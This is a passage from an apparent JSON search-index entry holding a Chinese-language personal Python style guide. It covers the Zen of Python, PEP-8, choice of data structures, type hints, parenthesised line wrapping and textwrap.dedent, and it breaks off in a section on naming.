\u65e0\u8bba\u662f\u6587\u8a00\u6587\u7248\u672c\u8fd8\u662f\u73b0\u4ee3\u6587\u7248\u672c\uff0c\u8fd9\u90fd\u662f\u4e0d\u53ef\u907f\u514d\u7684\u3002","title":"7. \u4f7f\u7528 locals() \u53d6\u4ee3 API \u8bf7\u6c42\u53c2\u6570\u5217\u8868"},{"location":"blog/2022/220529-python-personal-styleguide/","tags":["python"],"text":"\u6458\u8981 \u8fd9\u662f\u4e00\u7bc7\u7b80\u8981\u7684 Python \u4ee3\u7801\u98ce\u683c\u6307\u5bfc\uff0c\u4ee3\u8868\u4e86\u6211\u4e2a\u4eba\u6240\u503e\u5411\u7684\u4ee3\u7801\u98ce\u683c\u3002\u4f7f\u7528\u8fd9\u4e9b\u98ce\u683c\u53ef\u4ee5\u8ba9\u4f60\u7684\u4ee3\u7801\u770b\u8d77\u6765\u66f4 Pythonic\uff0c\u66f4\u7cbe\u70bc\u5730\u63cf\u8ff0\u4f60\u4ee3\u7801\u6240\u4f5c\u7684\u5de5\u4f5c\uff0c\u6216\u8bb8\u4e5f\u53ef\u4ee5\u51cf\u8f7b\u4f60\u7684\u91cd\u6784\u538b\u529b\u3002 \u6bcf\u4e2a\u4eba\u7684\u98ce\u683c\u53ef\u80fd\u5927\u540c\u5c0f\u5f02\uff0c\u4e5f\u6709\u53ef\u80fd\u5927\u76f8\u5f84\u5ead\uff0c\u5199\u5728\u8fd9\u91cc\u5e76\u4e0d\u4ee3\u8868\u6211\u7684\u5c31\u662f\u6700\u597d\u7684\u3002\u6211\u6240\u5e0c\u671b\u7684\u662f\uff0c\u8bfb\u8005\u9605\u8bfb\u5b8c\u6b64\u7bc7\u6587\u7ae0\u540e\u80fd\u591f\u6709\u6240\u542f\u53d1\uff0c\u6216\u662f\u53d1\u73b0\u81ea\u5df1\u4ece\u672a\u4f7f\u7528\u8fc7\u7684\u4f18\u96c5\u65b9\u6cd5\uff0c\u6216\u662f\u6539\u5584\u81ea\u5df1\u4ece\u672a\u610f\u8bc6\u5230\u7684\u4e11\u964b\u5199\u6cd5\uff0c\u5982\u6b64\u4e00\u6765\u6211\u5c31\u5df2\u7ecf\u5f88\u6ee1\u8db3\u4e86\u3002 \u8fd9\u91cc\u9762\u7684\u5f88\u591a\u793a\u4f8b\u4ee3\u7801\uff08\u5305\u62ec\u574f\u4ee3\u7801\uff09\u6765\u6e90\u4e8e\u6211\u4fee\u6539\u81ea\u5df1\u7684\u4ee3\u7801\u800c\u5f97\u51fa\u7684\u7ecf\u9a8c\u4e0e\u98ce\u683c\uff0c\u6211\u4e5f\u6b63\u662f\u5728\u4fee\u6539\u5e76\u7f8e\u5316\u8fd9\u4e9b\u4ee3\u7801\u7684\u8fc7\u7a0b\u4e2d\u4ea7\u751f\u4e86\u5199\u8fd9\u4e48\u4e00\u7bc7\u6587\u7ae0\u7684\u60f3\u6cd5\u3002 \u4e00\u3001\u7eea\u8bba \u00b6 1.1 Python \u4e4b\u7985\uff1a import this \u00b6 Python\u4e4b\u7985\u6700\u65e9\u7531 Tim Peters \u5728 Python \u90ae\u4ef6\u5217\u8868 \u4e2d\u53d1\u8868\uff0c\u5b83\u5305\u542b\u4e86\u5f71\u54cd Python \u7f16\u7a0b\u8bed\u8a00\u8bbe\u8ba1\u768419\u6761\u8f6f\u4ef6\u7f16\u5199\u539f\u5219\u3002 import this \u82f1\u6587\u7248 \ud83c\uddec\ud83c\udde7 \u4e2d\u6587\u7248 \ud83c\udde8\ud83c\uddf3 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 Beautiful is better than ugly. Explicit is better than implicit. Simple is better than complex. Complex is better than complicated. Flat is better than nested. Sparse is better than dense. Readability counts. Special cases aren't special enough to break the rules. Although practicality beats purity. Errors should never pass silently. Unless explicitly silenced. In the face of ambiguity, refuse the temptation to guess. There should be one-- and preferably only one --obvious way to do it. Although that way may not be obvious at first unless you're Dutch. Now is better than never. Although never is often better than *right* now. If the implementation is hard to explain, it's a bad idea. If the implementation is easy to explain, it may be a good idea. Namespaces are one honking great idea -- let's do more of those! 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 ``` linenums=\"1\" \u4f18\u7f8e\u4f18\u4e8e\u4e11\u964b \u660e\u4e86\u4f18\u4e8e\u9690\u6666 \u7b80\u5355\u4f18\u4e8e\u590d\u6742 \u590d\u6742\u4f18\u4e8e\u7e41\u6742 \u6241\u5e73\u4f18\u4e8e\u5d4c\u5957 \u7a00\u758f\u4f18\u4e8e\u7a20\u5bc6 \u53ef\u8bfb\u6027\u5f88\u91cd\u8981 \u7279\u4f8b\u4ea6\u4e0d\u53ef\u8fdd\u80cc\u539f\u5219 \u5373\u4f7f\u5b9e\u7528\u6bd4\u7eaf\u7cb9\u66f4\u4f18 \u9519\u8bef\u7edd\u4e0d\u80fd\u6084\u6084\u5ffd\u7565 \u9664\u975e\u5b83\u660e\u786e\u9700\u8981\u5982\u6b64 \u9762\u5bf9\u4e0d\u786e\u5b9a\u6027\uff0c\u62d2\u7edd\u5984\u52a0\u731c\u6d4b \u4efb\u4f55\u95ee\u9898\u5e94\u6709\u4e00\u79cd\uff0c\u4e14\u6700\u597d\u53ea\u6709\u4e00\u79cd\uff0c\u663e\u800c\u6613\u89c1\u7684\u89e3\u51b3\u65b9\u6cd5 \u5c3d\u7ba1\u8fd9\u65b9\u6cd5\u4e00\u5f00\u59cb\u5e76\u975e\u5982\u6b64\u76f4\u89c2\uff08\u9664\u975e\u4f60\u662f\u8377\u5170\u4eba\uff09 \u505a\u4f18\u4e8e\u4e0d\u505a \u7136\u800c\u4e0d\u5047\u601d\u7d22\u8fd8\u4e0d\u5982\u4e0d\u505a \u5f88\u96be\u89e3\u91ca\u7684\uff0c\u5fc5\u7136\u662f\u574f\u65b9\u6cd5 \u5f88\u597d\u89e3\u91ca\u7684\uff0c\u53ef\u80fd\u662f\u597d\u65b9\u6cd5 \u547d\u540d\u7a7a\u95f4\u662f\u4e2a\u7edd\u5999\u7684\u4e3b\u610f\uff0c\u6211\u4eec\u5e94\u597d\u597d\u5229\u7528\u5b83 1.2 PEP-8 \u00b6 PEP-8 \u5168\u79f0 PEP 8 \u2013 Style Guide for Python Code \uff0c\u5b83\u7ed9\u51fa\u4e86\u6784\u6210 Python \u4e3b\u53d1\u884c\u7248\u4e2d\u6807\u51c6\u5e93\u7684 Python \u4ee3\u7801\u7684\u7f16\u7801\u89c4\u8303\u3002 \u9075\u5b88 PEP-8 \u662f\u4e00\u4e2a\u5f88\u597d\u7684\u4e60\u60ef\uff0c\u5b83\u5e76\u4e0d\u662f\u4e00\u4e2a\u5fc5\u987b\u7684\u89c4\u8303\u3002\u7136\u800c\u6211\u81ea\u5df1\u7684\u5efa\u8bae\u662f\uff1a \u65e0\u8bba\u5728\u4efb\u4f55\u60c5\u51b5\u4e0b\uff0c\u90fd\u8bf7\u9075\u5b88 PEP-8 \u89c4\u8303 \u3002 PEP-8 \u53ef\u4ee5\u8ba9\u4f60\u7684\u4ee3\u7801\u770b\u8d77\u6765\u66f4\u89c4\u8303\uff0c\u66f4\u7b80\u6d01\uff0c\u66f4\u6613\u8bfb\u3002\u5c24\u5176\u662f\u7edf\u4e00\u7684\u683c\u5f0f\uff0c\u66f4\u5bb9\u6613\u88ab\u4eba\u9605\u8bfb\u3002 \u4e00\u4e9b IDE\uff08\u4f8b\u5982 PyCharm\uff09\u53ef\u4ee5\u81ea\u52a8\u6807\u8bb0\u4f60\u4ee3\u7801\u4e2d\u4e0d\u9075\u5b88 PEP-8 \u7684\u60c5\u51b5\u3002\u9664\u6b64\u4ee5\u5916\uff0c\u4f60\u4e5f\u53ef\u4ee5\u901a\u8fc7\u4ee5\u4e0b\u65b9\u5f0f\u6765\u68c0\u67e5\u4f60\u7684\u4ee3\u7801\u662f\u5426\u9075\u5b88\u4e86 PEP-8 \u89c4\u8303\uff1a python -m pep8 --statistics my_file.py \u4e60\u60ef\u6027\u9075\u5b88 PEP-8 \u53ef\u80fd\u4f1a\u8ba9\u60a8\u53d8\u6210 PEP-8 \u7684\u53d7\u5bb3\u8005\uff0c\u5bfc\u81f4\u60a8\u4f7f\u7528\u5176\u4ed6\u8bed\u8a00\u65f6\u4ecd\u7136\u4fdd\u7559\u4e86 PEP-8 \u4e2d\u7684\u4e60\u60ef\uff0c\u5c3d\u7ba1\u8fd9\u4e9b\u8bed\u8a00\u4e2d\u5e76\u6ca1\u6709\u7c7b\u4f3c\u7684\u8981\u6c42\u3002 \u4e8c\u3001\u8be5\u4f7f\u7528\u4ec0\u4e48 \u00b6 2.1 \u4f7f\u7528\u5408\u9002\u7684\u5bf9\u8c61\u4f5c\u4e3a\u6570\u636e\u7ed3\u6784 \u00b6 Python \u4e2d\u6709\u591a\u79cd\u5bf9\u8c61\u2014\u2014\u5217\u8868\u3001\u5b57\u5178\u3001\u96c6\u5408\u3001\u5143\u7ec4\u548c\u5b57\u7b26\u4e32\uff0c\u4ee5\u4e0b\u662f\u5bf9\u6bd4\uff1a \u5143\u7d20\u53ef\u91cd\u590d \u5143\u7d20\u53ef\u8ffd\u52a0 \u5bf9\u8c61\u53ef\u54c8\u5e0c \u5143\u7d20\u53ef\u7d22\u5f15 \u5217\u8868 \ud83d\udfe2 \ud83d\udfe2 \ud83d\udd34 \ud83d\udfe2 \u5b57\u5178 \ud83d\udd34 \ud83d\udfe2 \ud83d\udd34 \ud83d\udd34 \u96c6\u5408 \ud83d\udd34 \ud83d\udfe2 \ud83d\udd34 \ud83d\udd34 \u5143\u7ec4 \ud83d\udfe2 \ud83d\udd34 \ud83d\udfe2 \ud83d\udfe2 \u5b57\u7b26\u4e32 \ud83d\udfe2 \ud83d\udd34 \ud83d\udfe2 \ud83d\udfe2 \u6ce8\uff1a \u5b57\u5178\u7684\u4e0d\u53ef\u91cd\u590d\u6307\u7684\u662f\uff0c\u5b57\u5178\u4e2d\u7684\u952e\u4e0d\u80fd\u91cd\u590d\u3002 \u662f\u5426\u53ef\u8ffd\u52a0\u7684\u6807\u51c6\u662f\uff0c\u9996\u5148\u8fd9\u4e2a\u5bf9\u8c61\u53ef\u4ee5\u8ffd\u52a0\u65b0\u5143\u7d20\uff0c\u5176\u6b21\u5728\u8ffd\u52a0\u524d\u540e\uff0c\u4f7f\u7528 id () \u51fd\u6570\u8ba1\u7b97\u51fa\u7684\u6307\u9488\u662f\u5426\u4e00\u81f4\uff08\u5373\u662f\u5426\u4ecd\u4e3a\u540c\u4e00\u4e2a\u5bf9\u8c61\uff09\u3002 \u53ef\u4ee5\u4f7f\u7528 hash () \u51fd\u6570\u6216\u662f __hash__ () \u9b54\u6cd5\u65b9\u6cd5\u7684\u5bf9\u8c61\u89c6\u4e3a\u53ef\u54c8\u5e0c\u3002 \u7531\u4e8e\u6240\u6709\u7684\u53ef\u8fed\u4ee3\u5bf9\u8c61\uff08\u4e0a\u97625\u4e2a\u90fd\u662f\uff09\u90fd\u53ef\u4ee5\u4f7f\u7528 sorted () \u51fd\u6570\u8fdb\u884c\u6392\u5e8f\uff0c\u91c7\u7528\u8fd9\u4e2a\u6807\u51c6\u6765\u8fdb\u884c\u6bd4\u8f83\u662f\u6ca1\u6709\u610f\u4e49\u7684\uff0c\u6240\u4ee5\u4e0d\u91c7\u7528\u5143\u7d20\u662f\u5426\u6709\u5e8f\u4f5c\u4e3a\u8fd95\u4e2a\u5bf9\u8c61\u7684\u5bf9\u6bd4\u9879\u76ee\u3002 \u5143\u7d20\u53ef\u7d22\u5f15\u6307\u7684\u662f\u5bf9\u8c61\u4e2d\u7684\u5143\u7d20\u662f\u5426\u53ef\u4ee5\u6309\u987a\u5e8f\u7d22\u5f15\uff08\u6216\u8005\u8bf4\u662f\u5426\u5177\u6709\u7c7b\u4f3c\u7ebf\u6027\u8868\u4e00\u6837\u7684\u5b58\u50a8\u7ed3\u6784\uff09\uff0c\u800c\u4e0d\u662f\u6307\u8be5\u5bf9\u8c61\u662f\u5426\u5177\u6709 __setitem__ () \u9b54\u6cd5\u65b9\u6cd5\u3002 \u9664\u5b57\u7b26\u4e32\u5916\uff0c\u5176\u4f594\u4e2a\u901a\u5e38\u7528\u4e8e\u8868\u793a\u4e00\u7ec4\u6570\u636e\uff08\u6216\u6620\u5c04\uff0c\u4f8b\u5982\u5b57\u5178\uff09\u3002\u4ee5\u4e0b\u662f\u6211\u603b\u7ed3\u7684 \u5728\u4ec0\u4e48\u65f6\u5019\u4f7f\u7528\u4ec0\u4e48\u6837\u7684\u6570\u636e\u7ed3\u6784 \uff1a \u5217\u8868\uff08 list \uff09-> \u7edd\u5927\u591a\u6570\u60c5\u51b5\u4e0b\u7684\u6700\u4f73\u9009\u62e9 \u4f60\u7684\u6570\u636e\u662f\u6309\u987a\u5e8f\u7d22\u5f15\u7684\uff0c\u5e76\u4e14\u9700\u8981\u9891\u7e41\u5730\u4fee\u6539\u3001\u8ffd\u52a0\u3001\u5220\u9664\u3002\uff08\u6362\u53e5\u80fd\u542c\u61c2\u7684\u4eba\u8bdd\uff1a\u94fe\u8868\uff09 \u5b57\u5178\uff08 dict \uff09 \u4f60\u9700\u8981\u4f7f\u7528\u4e00\u4e2a\u7c7b\u4f3c\u54c8\u5e0c\u8868\uff08\u6563\u5217\u8868\uff09\u7684\u6570\u636e\u7ed3\u6784\u3002 \u96c6\u5408\uff08 set \uff09 \u4f60\u7684\u6570\u636e\u9700\u8981\u9891\u7e41\u5730\u8ffd\u52a0\u3001\u5220\u9664\uff0c\u5e76\u4e14\u4f60\u786e\u4fe1\u4f60\u53ef\u80fd\u4f1a\u8ffd\u52a0\u76f8\u540c\u7684\u6570\u636e\uff0c\u800c\u8fd9\u662f\u4f60\u60f3\u8981\u907f\u514d\u7684\u3002 \u5143\u7ec4\uff08 tuple \uff09 \u4f60\u7684\u6570\u636e\u53ea\u9700\u8981\u5b9a\u4e49\u4e00\u6b21\uff0c\u5e76\u4e14\u4ece\u4e0d\u4fee\u6539\u3001\u8ffd\u52a0\u3001\u5220\u9664\u3002\u6216\u8005\u5f53\u4f60\u7684\u6570\u636e\u603b\u662f\u7ec4\u961f\u51fa\u73b0\u65f6\uff08\u4f8b\u5982\u5750\u6807\u3001TCP\u56db\u5143\u7ec4\uff09\u3002 \u53ef\u80fd\u6b64\u65f6\u67d0\u4e9b\u4eba\u770b\u5b8c\u4f1a\u94bb\u725b\u89d2\u5c16\uff0c\u975e\u5f97\u6401\u8fd9\u7ea0\u7ed3\u4ec0\u4e48\u94fe\u8868\u548c\u6570\u7ec4\u6027\u80fd\u5dee\u5f02\u548c\u5b9e\u73b0\u4e0a\u7684\u4e0d\u540c\uff0c\u6211\u5df2\u7ecf\u8bf4\u5f97\u5f88\u6e05\u695a\u4e86\uff0c\u548c\u7ebf\u6027\u8868\u8fd9\u7c7b\u4e1c\u897f\u4f5c\u6bd4\u8f83 \u4ec5\u4ec5\u662f\u4e3a\u4e86\u6253\u6bd4\u65b9 \u3002\u4f60\u8981\u8fd9\u4e48\u7ea0\u7ed3\u4f60\u5c31\u53bb\u7528 np.ndarray \uff0c\u6216\u8005\u5e72\u8106\u522b\u7528 Python \u4e86\uff0c\u76f4\u63a5\u53bb\u7528\u4f60\u5fc3\u7231\u7684 C/C++\uff0c\u800c\u4e0d\u7528\u5728\u8fd9\u7ea0\u7ed3 Python \u7684\u51e0\u4e2a\u5bf9\u8c61\u3002 2.2 \u79ef\u6781\u4f7f\u7528\u7c7b\u578b\u6ce8\u91ca \u00b6 \u4f7f\u7528\u7c7b\u578b\u6ce8\u91ca\u53ef\u4ee5\u8ba9\u4f60\u7684 IDE \u548c\u5176\u4ed6\u5f00\u53d1\u8005\u66f4\u597d\u5730\u9605\u8bfb\u4f60\u7684\u4ee3\u7801\uff0c\u5e76\u4e14\u5728\u540e\u671f\u7684\u91cd\u6784\u65f6\uff0c\u80fd\u66f4\u5927\u80c6\u5730\u8fdb\u884c\u4ee3\u7801\u590d\u7528\uff0c\u800c\u65e0\u987b\u7ea0\u7ed3\u53c2\u6570\u7684\u7c7b\u578b\u3002 Example Good: def foo ( x : int , y : int ) -> int : return x + y Bad: def foo ( x , y ): return x + y \u53ef\u4ee5\u4f7f\u7528 typing \u6807\u51c6\u5e93\u6765\u7f16\u5199\u66f4\u9ad8\u7ea7\u7684\u7c7b\u578b\u6ce8\u91ca\uff0c\u4f8b\u5982\uff1a Example from typing import TypeVar , Union RealNumeric = TypeVar ( 'RealNumeric' , int , float ) def create_complex ( re : RealNumeric = 0 , im : RealNumeric = 0 ) -> Union [ RealNumeric , complex ]: return re + im * 1 j \u751a\u81f3\u4f7f\u7528\u6cdb\u578b\uff1a Example from typing import TypeVar _T = TypeVar ( '_T' ) def if_pattern ( pattern : list [ tuple [ bool , _T ]]) -> _T : return filter ( lambda x : x [ 0 ], pattern ) . __next__ ()[ 1 ] 2.3 \u51fd\u6570\u7684\u529f\u80fd\u5e94\u5177\u6709\u4e13\u4e00\u6027 \u00b6 Example Ugly: def calc ( const : Optional [ float ], rating : Optional [ float ], score : Optional [ float ]) -> float : if const is None : return calc_const ( rating , score ) if rating is None : return calc_rating ( const , score ) if score is None : return calc_score ( const , rating ) else : raise ValueError ( 'Invalid input!' ) \u8bf7\u6ce8\u610f\uff0c\u8fd9\u662f\u6211\u66fe\u7ecf\u7528\u4e8e\u8ba1\u7b97\u67d0\u4e2a\ud83c\uddec\ud83c\udde7\u6e38\u620f\u7684\u4e00\u4e9b\u6570\u503c\u65f6\u91c7\u7528\u7684\u51fd\u6570\u5199\u6cd5\uff0c\u73b0\u5728\u6211\u89c9\u5f97\u5b83\u5947\u4e11\u65e0\u6bd4\u3002 \u4e09\u3001\u8be5\u53d6\u4ee3\u4ec0\u4e48 \u00b6 3.1 \u4f7f\u7528 \u4f18\u7f8e \u7684\u73b0\u6709\u65b9\u6cd5\u53d6\u4ee3 \u4e11\u964b \u7684\u81ea\u884c\u5b9e\u73b0 \u00b6 \u4ee5\u5224\u65ad\u5b57\u5178\u4e2d\u662f\u5426\u6709\u67d0\u4e2a\u952e\u7684\u65b9\u6cd5\u4e3a\u4f8b\uff1a Example Good: if 'some_key' in d : ... Bad: if d . __contains__ ( 'some_key' ): ... if d . has_key ( 'some_key' ): ... \u5e76\u4e14\u8bf7\u6ce8\u610f\uff1a\u4e8b\u5b9e\u4e0a\uff0c dict \u7c7b\u7684 has_key () \u65b9\u6cd5\u5df2\u7ecf \u5728 Python3 \u4e2d\u88ab\u79fb\u9664 \uff0c\u6240\u4ee5\u5927\u90e8\u5206\u60c5\u51b5\u4e0b\u4f60\u4e5f\u7528\u4e0d\u7740\u5b83\uff08\u6216\u8005\u6ca1\u6cd5\u7528\u5b83\uff09\u3002 \u7531\u4e8e Python \u81ea\u8eab\u7684\u6027\u8d28\uff0c\u4f7f\u7528 Python \u5b9e\u73b0\u4e00\u4e2a\u7279\u5b9a\u7684\u529f\u80fd\u975e\u5e38\u5bb9\u6613\uff0c\u4f46\u4e5f\u6b63\u56e0\u4e3a\u5982\u6b64\uff0c\u6709\u4e0d\u5c11\u521d\u5b66\u8005\u5728\u5b66\u4e60\u524d\u671f\u4f1a\u4f7f\u7528\u5927\u91cf\u7684\u81ea\u884c\u5b9e\u73b0\uff0c\u8fd9\u79cd\u81ea\u884c\u5b9e\u73b0\u53c8\u5e38\u5e38\u88ab\u79f0\u4e3a \u91cd\u590d\u53d1\u660e\u8f6e\u5b50 \u3002 \u91cd\u590d\u53d1\u660e\u8f6e\u5b50\u5e76\u4e0d\u4e00\u65e0\u662f\u5904\uff0c\u5bf9\u4e8e\u521d\u5b66\u8005\u800c\u8a00\uff0c\u8fd9\u5e38\u5e38\u662f\u4e00\u79cd\u63d0\u5347\u81ea\u8eab\u57fa\u672c\u80fd\u529b\u7684\u6709\u6548\u624b\u6bb5\u3002\u7136\u800c\u5bf9\u4e8e\u5e76\u975e\u521d\u5b66\u8005\u7684\u6211\u4eec\uff0c\u91cd\u590d\u53d1\u660e\u8f6e\u5b50\u5df2\u7ecf\u4e0d\u518d\u6709\u4efb\u4f55\u7528\u9014\u4e86\uff0c\u56e0\u6b64\u9700\u8981\u6781\u529b\u907f\u514d\u8fd9\u79cd\u60c5\u51b5\u53d1\u751f\u3002 \u4e00\u822c\u6765\u8bf4\uff0c\u9009\u62e9\u5177\u4f53\u7684\u5b9e\u73b0\u65b9\u6cd5\u65f6\uff0c\u8003\u8651\u4ee5\u4e0b\u4f18\u5148\u987a\u5e8f\uff1a \u8bed\u53e5\u3001 Builtins \u51fd\u6570 \u9b54\u6cd5\u65b9\u6cd5 \u3001\u65b9\u6cd5 Python \u6807\u51c6\u5e93 \u7b2c\u4e09\u65b9\u5e93 \u81ea\u884c\u5b9e\u73b0 \u5728\u591a\u79cd\u5b9e\u73b0\u7684\u590d\u6742\u5ea6\u76f8\u5dee\u65e0\u51e0\u65f6\uff0c\u4e0a\u9762\u6392\u5e8f\u8d8a\u9760\u524d\u7684\u5b9e\u73b0\u65b9\u6cd5\u770b\u8d77\u6765\u8d8a\u4f18\u96c5\uff0c\u800c\u8d8a\u5f80\u540e\u7684\u5b9e\u73b0\u65b9\u6cd5\u770b\u8d77\u6765\u8d8a\u4e11\u964b\u3002\u53ea\u6709\u5728\u4f60\u53d1\u73b0\u9760\u524d\u7684\u65b9\u6cd5\u65e0\u6cd5\u6ee1\u8db3\u4f60\u7684\u9700\u6c42\uff08\u6216\u8fc7\u4e8e\u590d\u6742\uff09\u65f6\uff0c\u624d\u6709\u5fc5\u8981\u8003\u8651\u9760\u540e\u7684\u65b9\u6cd5\u3002 3.2 \u4f7f\u7528\u62ec\u53f7\u6362\u884c\u53d6\u4ee3\u6362\u884c\u7b26\u6362\u884c \u00b6 Python \u4e2d\u7684\u62ec\u53f7\u6709\u4e2a \u7279\u6027 \uff0c\u5c31\u662f\u62ec\u53f7\u4e2d\u7684\u8868\u8fbe\u5f0f\u53ef\u4ee5\u5728\u4e00\u4e2a\u884c\u4e0a\u76f4\u63a5\u5206\u5272\uff0c\u800c\u65e0\u987b\u4f7f\u7528 \\ \u6362\u884c\u3002 \u4ee5 import \u8bed\u53e5\u4e3a\u4f8b\uff1a Example Good: from .make_score_image import ( moe_draw_recent , guin_draw_recent , bandori_draw_recent , andreal_v1_draw_recent , andreal_v2_draw_recent , andreal_v3_draw_recent , andreal_draw_b30 , song_list , draw_b30 , ) Bad: from .make_score_image import moe_draw_recent , guin_draw_recent , bandori_draw_recent , song_list , draw_b30 , \\ andreal_v1_draw_recent , andreal_v2_draw_recent , andreal_v3_draw_recent , andreal_draw_b30 \u503c\u5f97\u6ce8\u610f\u7684\u662f\uff0c\u5728\u62ec\u53f7\u5185\u8fdb\u884c\u6362\u884c\u540e\uff0c\u8bf7\u6ce8\u610f\u7f29\u8fdb\u3002\u8981\u4e48\u4f7f\u7528\u5782\u76f4\u7f29\u8fdb\uff0c\u8981\u4e48\u4f7f\u7528\u60ac\u6302\u7f29\u8fdb\u3002 \u4ee5 if \u8bed\u53e5\u4e3a\u4f8b\uff1a Example Good: # 4\u7a7a\u683c\u60ac\u6302\u7f29\u8fdb if ( this_vid != last_vid or this_vid == last_vid and ( this_lang in [ 'zh-Hans' , 'zh' ] or this_lang == 'ja' and last_lang not in [ 'zh-Hans' , 'zh' ] or this_lang == 'en' and last_lang not in [ 'zh-Hans' , 'zh' , 'ja' ] ) ): ... # \u4f7f\u7528\u5782\u76f4\u7f29\u8fdb if ( this_vid != last_vid or this_vid == last_vid and ( this_lang in [ 'zh-Hans' , 'zh' ] or this_lang == 'ja' and last_lang not in [ 'zh-Hans' , 'zh' ] or this_lang == 'en' and last_lang not in [ 'zh-Hans' , 'zh' , 'ja' ])): ... Bad: # \u65e0\u4efb\u4f55\u7f29\u8fdb if this_vid != last_vid or this_vid == last_vid and ( this_lang in [ 'zh-Hans' , 'zh' ] or this_lang == 'ja' and last_lang not in [ 'zh-Hans' , 'zh' ] or this_lang == 'en' and last_lang not in [ 'zh-Hans' , 'zh' , 'ja' ]): ... # \u4f7f\u7528\u4e11\u964b\u7684 \\ \u8fdb\u884c\u6362\u884c if this_vid != last_vid or this_vid == last_vid \\ and ( this_lang in [ 'zh-Hans' , 'zh' ] or this_lang == 'ja' \\ and last_lang not in [ 'zh-Hans' , 'zh' ] or this_lang == 'en' \\ and last_lang not in [ 'zh-Hans' , 'zh' , 'ja' ]): ... # 4\u7a7a\u683c\u60ac\u6302\u7f29\u8fdb\u5bf9\u9f50\u5230 if if this_vid != last_vid or this_vid == last_vid and ( this_lang in [ 'zh-Hans' , 'zh' ] or this_lang == 'ja' and last_lang not in [ 'zh-Hans' , 'zh' ] or this_lang == 'en' and last_lang not in [ 'zh-Hans' , 'zh' , 'ja' ]): ... \u4ee5\u5b57\u7b26\u4e32\u7684\u591a\u884c\u62fc\u63a5\u4e3a\u4f8b\uff1a Example Good: text = ( f '\u9879\u76ee\uff1a { repo . name } \\n ' f '\u4f5c\u8005\uff1a { owner } \\n ' f '\u5927\u5c0f\uff1a { repo . size } KB \\n ' f '\u8bed\u8a00\uff1a { repo . language or \"\u65e0\" } \\n ' f '\u8bb8\u53ef\u8bc1\uff1a { license_ } \\n ' f '\ud83d\udc1e: { repo . open_issues_count } \u2b50: { repo . stargazers_count } \ud83c\udf74: { repo . forks_count } \\n ' f '\u521b\u5efa\u65f6\u95f4\uff1a { format_time ( repo . created_at ) } \\n ' f '\u4e0a\u6b21\u63d0\u4ea4\uff1a { format_time ( repo . pushed_at ) } \\n ' f '\u63cf\u8ff0\uff1a { repo . description or \"\u65e0\" } \\n ' f '\u6807\u7b7e\uff1a { tags } ' ) Bad: text = f '\u9879\u76ee\uff1a { repo . name } \\n ' \\ f '\u4f5c\u8005\uff1a { owner } \\n ' \\ f '\u5927\u5c0f\uff1a { repo . size } KB \\n ' \\ f '\u8bed\u8a00\uff1a { repo . language or \"\u65e0\" } \\n ' \\ f '\u8bb8\u53ef\u8bc1\uff1a { license_ } \\n ' \\ f '\ud83d\udc1e: { repo . open_issues_count } \u2b50: { repo . stargazers_count } \ud83c\udf74: { repo . forks_count } \\n ' \\ f '\u521b\u5efa\u65f6\u95f4\uff1a { format_time ( repo . created_at ) } \\n ' \\ f '\u4e0a\u6b21\u63d0\u4ea4\uff1a { format_time ( repo . pushed_at ) } \\n ' \\ f '\u63cf\u8ff0\uff1a { repo . description or \"\u65e0\" } \\n ' \\ f '\u6807\u7b7e\uff1a { tags } ' \u63d0\u793a\uff1a\u5bf9\u4e8e\u9700\u8981\u5f88\u591a\u6362\u884c\u7684\u5b57\u7b26\u4e32\uff0c\u4f7f\u7528 \"\"\" \u642d\u914d textwrap.dedent() \u662f \u6700\u4f18 \u7684\u9009\u62e9\uff1a Example \u2b50 Best: import textwrap text = textwrap . dedent ( f \"\"\" \u9879\u76ee\uff1a { repo . name } \u4f5c\u8005\uff1a { owner } \u5927\u5c0f\uff1a { repo . size } KB \u8bed\u8a00\uff1a { repo . language or \"\u65e0\" } \u8bb8\u53ef\u8bc1\uff1a { license_ } \ud83d\udc1e: { repo . open_issues_count } \u2b50: { repo . stargazers_count } \ud83c\udf74: { repo . forks_count } \u521b\u5efa\u65f6\u95f4\uff1a { format_time ( repo . created_at ) } \u4e0a\u6b21\u63d0\u4ea4\uff1a { format_time ( repo . pushed_at ) } \u63cf\u8ff0\uff1a { repo . description or \"\u65e0\" } \u6807\u7b7e\uff1a { tags } \"\"\" ) textwrap \u662f Python \u6807\u51c6\u5e93\u4e4b\u4e00\uff0c\u5176\u4e2d\u7684 dedent() \u51fd\u6570\u53ef\u4ee5\u79fb\u9664 text \u4e2d\u6bcf\u4e00\u884c\u7684\u4efb\u4f55\u76f8\u540c\u524d\u7f00\u7a7a\u767d\u7b26\u3002\u8fd9\u53ef\u4ee5\u7528\u6765\u6e05\u9664\u4e09\u91cd\u5f15\u53f7\u5b57\u7b26\u4e32\u884c\u5de6\u4fa7\u7a7a\u683c\uff0c\u5e76\u5728\u6e90\u7801\u4e2d\u4ecd\u7136\u663e\u793a\u4e3a\u7f29\u8fdb\u683c\u5f0f\u3002 \u56db\u3001\u8be5\u907f\u514d\u4ec0\u4e48 \u00b6 4.1 \u907f\u514d\u8ff7\u60d1\u547d\u540d \u00b6 \u5f15\u7528 \u6539\u540d\u4e0d\u4ec5\u4ec5\u662f\u4fee\u6539\u540d\u5b57\u800c\u5df2\u3002\u5982\u679c\u4f60\u60f3\u4e0d\u51fa\u4e00\u4e2a\u597d\u540d\u5b57\uff0c\u8bf4\u660e\u80cc\u540e\u5f88\u53ef\u80fd\u6f5c\u85cf\u7740\u66f4\u6df1\u7684\u8bbe\u8ba1\u95ee\u9898\u3002\u4e3a\u4e00\u4e2a\u607c\u4eba\u7684\u540d\u5b57\u6240\u4ed8\u51fa\u7684\u7ea0\u7ed3\uff0c\u5e38\u5e38\u80fd\u63a8\u52a8\u6211\u4eec\u5bf9\u4ee3\u7801\u8fdb\u884c\u7cbe\u7b80\u3002 \u2014\u2014 \u300a\u91cd\u6784\uff1a\u6539\u5584\u65e2\u6709\u4ee3\u7801\u7684\u8bbe\u8ba1\u300b \u547d\u540d\u662f\u7a0b\u5e8f\u5458\u6700\u96be\u89e3\u51b3\u7684\u4e00\u4e2a\u95ee\u9898\u4e4b\u4e00\uff0c\u800c\u8ff7\u60d1\u547d\u540d\u5c06\u5bfc\u81f4\u540e\u671f\u91cd\u6784\u65f6\u65e0\u6cd5\u6b63\u786e\u7406\u89e3\u5bf9\u8c61\u7684\u542b\u4e49\u3002 \u867d\u7136\u6211\u4eec\u65e0\u6cd5\u505a\u5230 100% 